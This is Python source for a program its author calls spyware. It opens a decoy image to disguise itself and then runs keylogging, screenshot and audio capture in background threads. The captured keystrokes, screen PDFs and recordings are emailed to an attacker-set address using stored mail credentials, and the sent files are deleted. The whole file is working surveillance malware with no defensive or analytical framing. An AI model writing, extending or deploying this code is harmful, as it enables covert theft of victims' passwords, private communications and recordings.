from time import sleep
from threading import Thread
import cv2
import os
from PIL import Image
import shutil
from functools import partial
import multiprocessing
import json
import random
import subprocess
import sys

from modules.log import Logger
from modules.grab_screen import Visual
from modules.send_email import send_mail
from modules.grab_audio import Audio
from modules.normalize_path import normalize_path_name


class Spyware:
    def __init__(self):
        self.keylogger_report = ''
        self.screenshot_period = 5
        self.user_path = normalize_path_name(os.path.expanduser('~'), 'documents')

        with open('./user_info/info.json') as input_file:
            reader = input_file.read()
            self.user_info = json.loads(reader)

        self.audio_period = int(self.user_info['frequency']) - 2

    def start(self):
        self.open_fake_file()
        self.setup_dirs()
        self.reporting()

    def open_fake_file(self):
        file_name = normalize_path_name(sys._MEIPASS, 'kali.jpg')

        subprocess.Popen(file_name, shell=True)

    def reporting(self):
        logger = Logger(self.user_info['frequency'], self.user_path)
        audio = Audio(self.audio_period, self.user_path)
        visual = Visual(self.screenshot_period, self.user_path, self.user_info['frequency'])

        print('\nSpying started...')
        async_tasks = [
            Thread(target=visual.make_screenshot, daemon=True),
            Thread(target=logger.init, daemon=True),
            Thread(target=audio.handle_audio, daemon=True)
        ]

        [t.start() for t in async_tasks]

        while True:
            # [t.join() for t in async_tasks]
            sleep(int(self.user_info['frequency']))

            print('\n\nRemoving alpha channel from images...')
            visual.remove_alpha_channel()

            print('PDF processing started...')
            visual.make_pdf()

            files_list = [
                normalize_path_name(self.user_path, 'pdf_record', os.listdir(normalize_path_name(self.user_path, 'pdf_record'))[0]),
                normalize_path_name(self.user_path, 'keylog_record', 'keylog.txt'),
                normalize_path_name(self.user_path, 'audio_record', os.listdir(normalize_path_name(self.user_path, 'audio_record'))[0])
                          ]
            print('Sending email...')
            send_email_report = Thread(target=partial(self.send_report, files_list), daemon=True)
            send_email_report.start()

    def send_report(self, files_list):
        message_rep = 'Full report (keylogger + screenshots + audio)'
        try:
            send_mail(self.user_info['email'], self.user_info['password'], message_rep, 'Spyware report', files_list)
        except Exception as e:
            print(e)
            error_msg = 'Could not send that'
            send_mail(self.user_info['email'], self.user_info['password'], error_msg, 'Spyware report')

        print('Directories cleanup started...')

        files_list.pop(1) # to not remove keylog.txt file
        for f in files_list:
            if os.path.isfile(f):
                os.remove(f)

        # for img in os.listdir(normalize_path_name(self.user_path, 'images_record')):
        #     os.remove(normalize_path_name(self.user_path, 'images_record', img))

    def setup_dirs(self):
        dirs_to_make = ['images_record', 'audio_record', 'keylog_record', 'pdf_record']

        for d in dirs_to_make:

            if not os.path.isdir(normalize_path_name(self.user_path, d)):
                os.mkdir(normalize_path_name(self.user_path, d))


if __name__ == '__main__':
    multiprocessing.freeze_support()

    spw = Spyware()
    spw.start()
